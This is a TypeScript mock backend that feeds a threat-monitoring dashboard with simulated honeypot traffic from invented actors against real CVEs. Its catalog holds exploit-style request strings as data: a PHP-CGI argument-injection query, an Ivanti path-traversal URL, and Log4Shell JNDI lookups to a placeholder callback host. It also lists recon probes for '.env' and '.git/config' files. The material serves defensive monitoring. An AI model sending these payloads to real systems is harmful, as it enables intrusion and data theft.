// Simulated backend so the dashboard runs before the FastAPI service exists.
// Serves the same shapes as GET /api/cves, /api/events, /api/stats and /api/actors.

import type { Actor, AttackEvent, Classification, Cve, SourceTag, Stage, Stats } from './types';

// --- deterministic randomness -------------------------------------------------

function mulberry32(seed: number) {
  return () => {
    seed |= 0;
    seed = (seed + 0x6d2b79f5) | 0;
    let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}
const rand = mulberry32(20261101);
const pick = <T,>(xs: T[]) => xs[Math.floor(rand() * xs.length)];

// --- catalog ------------------------------------------------------------------

interface CveDef extends Cve {
  port: number;
  probe: { method: string; path: string };
  exploit: { method: string; path: string };
}

// Real CVEs with their real CVSS, KEV and patch facts; only the traffic is simulated.
const CVES: CveDef[] = [
  {
    id: 'CVE-2024-3400',
    description: 'GlobalProtect OS command injection',
    product: 'Palo Alto PAN-OS',
    severity: 'critical',
    cvss: 10.0,
    status: 'urgent',
    kev: true,
    patch_status: 'patched',
    published: '2024-04-12T00:00:00Z',
    port: 443,
    probe: { method: 'GET', path: '/global-protect/login.esp' },
    exploit: { method: 'POST', path: '/ssl-vpn/hipreport.esp' },
  },
  {
    id: 'CVE-2024-4577',
    description: 'PHP-CGI argument injection on Windows',
    product: 'PHP',
    severity: 'critical',
    cvss: 9.8,
    status: 'urgent',
    kev: true,
    patch_status: 'patched',
    published: '2024-06-09T00:00:00Z',
    port: 80,
    probe: { method: 'GET', path: '/index.php' },
    exploit: { method: 'POST', path: '/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1' },
  },
  {
    id: 'CVE-2023-46805',
    description: 'Web component authentication bypass',
    product: 'Ivanti Connect Secure',
    severity: 'high',
    cvss: 8.2,
    status: 'high',
    kev: true,
    patch_status: 'patched',
    published: '2024-01-12T00:00:00Z',
    port: 443,
    probe: { method: 'GET', path: '/api/v1/configuration/users/user-roles/user-role' },
    exploit: { method: 'GET', path: '/api/v1/totp/user-backup-code/../../license/keys-status' },
  },
  {
    id: 'CVE-2024-23897',
    description: 'CLI arbitrary file read',
    product: 'Jenkins',
    severity: 'critical',
    cvss: 9.8,
    status: 'high',
    kev: true,
    patch_status: 'patched',
    published: '2024-01-24T00:00:00Z',
    port: 8080,
    probe: { method: 'GET', path: '/login' },
    exploit: { method: 'POST', path: '/cli?remoting=false' },
  },
  {
    id: 'CVE-2021-44228',
    description: 'JNDI lookup remote code execution (Log4Shell)',
    product: 'Apache Log4j',
    severity: 'critical',
    cvss: 10.0,
    status: 'watch',
    kev: true,
    patch_status: 'patched',
    published: '2021-12-10T00:00:00Z',
    port: 8080,
    probe: { method: 'GET', path: '/?q=${jndi:dns://x.oast.example}' },
    exploit: { method: 'GET', path: '/?q=${jndi:ldap://x.oast.example/a}' },
  },
];

// Tracked but no decoy traffic yet.
const WATCHLIST: Cve[] = [
  {
    id: 'CVE-2024-6387',
    description: 'Signal handler race in sshd (regreSSHion)',
    product: 'OpenSSH',
    severity: 'high',
    cvss: 8.1,
    status: 'high',
    kev: false,
    patch_status: 'patched',
    published: '2024-07-01T00:00:00Z',
  },
  {
    id: 'CVE-2024-21762',
    description: 'SSL VPN out-of-bounds write',
    product: 'Fortinet FortiOS',
    severity: 'critical',
    cvss: 9.8,
    status: 'urgent',
    kev: true,
    patch_status: 'patched',
    published: '2024-02-09T00:00:00Z',
  },
];

const RECON_PATHS = [
  '/',
  '/robots.txt',
  '/.env',
  '/.git/config',
  '/wp-login.php',
  '/favicon.ico',
  '/boaform/admin/formLogin',
  '/cgi-bin/luci',
  '/actuator/health',
];
const SCAN_PORTS = [80, 80, 443, 443, 8080, 22, 23, 2323, 3389, 5555];

interface Source {
  asn: number;
  org: string;
  country: string;
  cc: string;
  region: string;
  city: string;
  lat: number;
  lng: number;
  prefix: string;
}

interface ActorDef {
  id: string;
  label: string;
  tags: SourceTag[];
  timezone: string;
  weight: number;
  cves: string[]; // empty = background noise only
  userAgents: string[];
  sources: Source[];
}

const ACTORS: ActorDef[] = [
  {
    id: 'censys',
    label: 'Censys',
    tags: ['scanner', 'cloud'],
    timezone: 'UTC−05',
    weight: 5,
    cves: [],
    userAgents: ['Mozilla/5.0 (compatible; CensysInspect/1.1)'],
    sources: [
      { asn: 398324, org: 'Censys, Inc.', country: 'United States', cc: 'US', region: 'Michigan', city: 'Ann Arbor', lat: 42.28, lng: -83.74, prefix: '167.94.138.' },
    ],
  },
  {
    id: 'shodan',
    label: 'Shodan',
    tags: ['scanner', 'cloud'],
    timezone: 'UTC−08',
    weight: 3,
    cves: [],
    userAgents: ['Mozilla/5.0 (compatible; Shodan)'],
    sources: [
      { asn: 10439, org: 'CariNet', country: 'United States', cc: 'US', region: 'California', city: 'San Diego', lat: 32.72, lng: -117.16, prefix: '198.20.69.' },
    ],
  },
  {
    id: 'routers',
    label: 'AX-19B',
    tags: ['residential'],
    timezone: 'mixed',
    weight: 6,
    cves: [],
    userAgents: ['Hello, World', 'Mozila/5.0', 'curl/7.68.0'],
    sources: [
      { asn: 812, org: 'Rogers Communications', country: 'Canada', cc: 'CA', region: 'Ontario', city: 'Toronto', lat: 43.65, lng: -79.38, prefix: '99.230.17.' },
      { asn: 577, org: 'Bell Canada', country: 'Canada', cc: 'CA', region: 'Quebec', city: 'Montreal', lat: 45.5, lng: -73.57, prefix: '70.52.141.' },
      { asn: 28573, org: 'Claro NXT', country: 'Brazil', cc: 'BR', region: 'São Paulo', city: 'São Paulo', lat: -23.55, lng: -46.63, prefix: '177.94.20.' },
      { asn: 7552, org: 'Viettel Group', country: 'Vietnam', cc: 'VN', region: 'Hanoi', city: 'Hanoi', lat: 21.03, lng: 105.85, prefix: '27.72.98.' },
      { asn: 9829, org: 'BSNL', country: 'India', cc: 'IN', region: 'Maharashtra', city: 'Mumbai', lat: 19.08, lng: 72.88, prefix: '117.211.44.' },
    ],
  },
  {
    id: 'wp',
    label: 'AX-4D2',
    tags: ['cloud'],
    timezone: 'UTC+01',
    weight: 4,
    cves: [],
    userAgents: ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0'],
    sources: [
      { asn: 14061, org: 'DigitalOcean', country: 'Germany', cc: 'DE', region: 'Hesse', city: 'Frankfurt', lat: 50.11, lng: 8.68, prefix: '164.92.180.' },
      { asn: 14061, org: 'DigitalOcean', country: 'Netherlands', cc: 'NL', region: 'North Holland', city: 'Amsterdam', lat: 52.37, lng: 4.9, prefix: '188.166.42.' },
    ],
  },
  {
    id: 'globalprotect',
    label: 'AX-7F3',
    tags: ['vpn', 'cloud'],
    timezone: 'UTC+08',
    weight: 3,
    cves: ['CVE-2024-3400', 'CVE-2023-46805'],
    userAgents: ['Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'],
    sources: [
      { asn: 20473, org: 'Vultr', country: 'Japan', cc: 'JP', region: 'Tokyo', city: 'Setagaya City', lat: 35.65, lng: 139.65, prefix: '45.77.30.' },
      { asn: 24940, org: 'Hetzner Online', country: 'Germany', cc: 'DE', region: 'Saxony', city: 'Falkenstein', lat: 50.48, lng: 12.37, prefix: '88.198.52.' },
      { asn: 45102, org: 'Alibaba Cloud', country: 'Singapore', cc: 'SG', region: 'Singapore', city: 'Singapore', lat: 1.35, lng: 103.82, prefix: '47.236.12.' },
    ],
  },
  {
    id: 'tor',
    label: 'AX-A11',
    tags: ['tor'],
    timezone: 'unknown',
    weight: 2,
    cves: ['CVE-2024-4577', 'CVE-2024-23897'],
    userAgents: ['python-requests/2.31.0', 'Go-http-client/1.1'],
    sources: [
      { asn: 60729, org: 'Tor exit relay', country: 'Germany', cc: 'DE', region: 'Berlin', city: 'Berlin', lat: 52.52, lng: 13.4, prefix: '185.220.101.' },
      { asn: 208323, org: 'Tor exit relay', country: 'Netherlands', cc: 'NL', region: 'South Holland', city: 'Rotterdam', lat: 51.92, lng: 4.48, prefix: '109.70.100.' },
    ],
  },
  {
    id: 'phpcgi',
    label: 'AX-2C8',
    tags: ['cloud'],
    timezone: 'UTC+09',
    weight: 2,
    cves: ['CVE-2024-4577'],
    userAgents: ['Mozilla/5.0 (Windows NT 10.0; Win64; x64)'],
    sources: [
      { asn: 16509, org: 'Amazon AWS', country: 'South Korea', cc: 'KR', region: 'Seoul', city: 'Seoul', lat: 37.57, lng: 126.98, prefix: '3.38.114.' },
    ],
  },
  {
    id: 'log4',
    label: 'AX-E05',
    tags: ['vpn'],
    timezone: 'UTC+03',
    weight: 1.5,
    cves: ['CVE-2021-44228'],
    userAgents: ['${jndi:ldap://x.oast.example/ua}'],
    sources: [
      { asn: 9009, org: 'M247', country: 'Romania', cc: 'RO', region: 'Bucharest', city: 'Bucharest', lat: 44.43, lng: 26.1, prefix: '185.236.200.' },
    ],
  },
];

// Each source gets a small, stable pool of IPs so actors resurface on the same addresses.
const ipPools = new Map<Source, string[]>();
for (const a of ACTORS) {
  for (const s of a.sources) {
    ipPools.set(
      s,
      Array.from({ length: 2 + Math.floor(rand() * 4) }, () => s.prefix + (2 + Math.floor(rand() * 250))),
    );
  }
}

// --- generation ---------------------------------------------------------------

const HISTORY_MS = 90 * 60_000;
const RATE_PER_SEC = 0.35;

interface MockHit extends AttackEvent {
  actor: ActorDef;
  tags: SourceTag[];
}

const hits: MockHit[] = [];
let cursor = Date.now() - HISTORY_MS;
let seq = 0;
let generated = 0;

/** Targeted operators work in sessions; scanners hum along constantly. */
function actorWeight(a: ActorDef, t: number) {
  if (a.cves.length === 0) return a.weight;
  const phase = (t / 60_000 / 11 + a.id.length) % 1;
  return a.weight * (phase < 0.45 ? 1.6 : 0.15);
}

function makeHit(t: number): MockHit {
  const weights = ACTORS.map((a) => actorWeight(a, t));
  let r = rand() * weights.reduce((x, y) => x + y, 0);
  let actor = ACTORS[0];
  for (let i = 0; i < ACTORS.length; i++) {
    r -= weights[i];
    if (r <= 0) {
      actor = ACTORS[i];
      break;
    }
  }
  const src = pick(actor.sources);

  let stage: Stage = 'recon';
  let classification: Classification = 'noise';
  let cveId: string | null = null;
  let port = pick(SCAN_PORTS);
  let req = { method: 'GET', path: pick(RECON_PATHS) };

  if (actor.cves.length) {
    const roll = rand();
    if (roll > 0.2) {
      const want = pick(actor.cves);
      const cve = CVES.find((c) => c.id === want)!;
      cveId = cve.id;
      classification = 'targeted';
      stage = roll > 0.62 ? 'exploit' : 'probe';
      req = stage === 'exploit' ? cve.exploit : cve.probe;
      port = cve.port;
    }
  } else if (rand() < 0.18) {
    // Generic scanners occasionally fingerprint a product page without exploiting anything.
    const cve = pick(CVES);
    stage = 'probe';
    req = cve.probe;
    port = cve.port;
  }

  return {
    id: `h_${(seq++).toString(36)}`,
    source_ip: pick(ipPools.get(src)!),
    asn: src.asn,
    port,
    timestamp: new Date(t).toISOString(),
    classification,
    org: src.org,
    country: src.country,
    country_code: src.cc,
    region: src.region,
    city: src.city,
    lat: src.lat,
    lng: src.lng,
    cve_id: cveId,
    method: req.method,
    path: req.path,
    stage,
    actor_id: `act_${actor.id}`,
    actor,
    tags: actor.tags,
  };
}

function advance(now: number) {
  while (true) {
    const gap = (-Math.log(1 - rand()) / RATE_PER_SEC) * 1000;
    if (cursor + gap > now) break;
    cursor += gap;
    hits.push(makeHit(cursor));
    generated++;
  }
  const cutoff = now - HISTORY_MS;
  while (hits.length && Date.parse(hits[0].timestamp) < cutoff) hits.shift();
}

function toEvent({ actor: _a, tags: _t, ...e }: MockHit): AttackEvent {
  return e;
}

// --- endpoints ----------------------------------------------------------------

const STATS_BASE = { new_cves: 268, updated_cves: 1017, newly_patched: 58, newly_kev: 3, total_hits: 17840 };

export function mockCves(): Cve[] {
  return [...CVES.map(({ port: _p, probe: _pr, exploit: _ex, ...c }) => c), ...WATCHLIST];
}

export function mockEvents(limit = 500): AttackEvent[] {
  advance(Date.now());
  return hits.slice(-limit).reverse().map(toEvent);
}

export function mockStats(): Stats {
  advance(Date.now());
  // New CVEs trickle in at roughly the real ~290/day pace.
  const minutes = Math.floor((Date.now() % 86_400_000) / 300_000);
  return {
    new_cves: STATS_BASE.new_cves + (minutes % 24),
    updated_cves: STATS_BASE.updated_cves + (minutes % 40),
    newly_patched: STATS_BASE.newly_patched,
    newly_kev: STATS_BASE.newly_kev,
    total_hits: STATS_BASE.total_hits + generated,
    window: '24h',
  };
}

export function mockActors(): Actor[] {
  advance(Date.now());
  return ACTORS.map((a) => {
    const mine = hits.filter((h) => h.actor === a);
    return {
      id: `act_${a.id}`,
      label: a.label,
      ips: [...new Set(mine.map((h) => h.source_ip))],
      asns: [...new Set(mine.map((h) => h.asn))],
      classification: (mine.some((h) => h.classification === 'targeted') ? 'targeted' : 'noise') as Classification,
      hit_count: mine.length,
      first_seen: mine[0]?.timestamp ?? '',
      last_seen: mine.at(-1)?.timestamp ?? '',
      countries: [...new Set(mine.map((h) => h.country_code!))],
      tags: a.tags,
      timezone: a.timezone,
      cves: [...new Set(mine.map((h) => h.cve_id).filter((x): x is string => !!x))],
    };
  })
    .filter((a) => a.hit_count > 0)
    .sort((a, b) =>
      a.classification === b.classification ? b.hit_count - a.hit_count : a.classification === 'targeted' ? -1 : 1,
    );
}
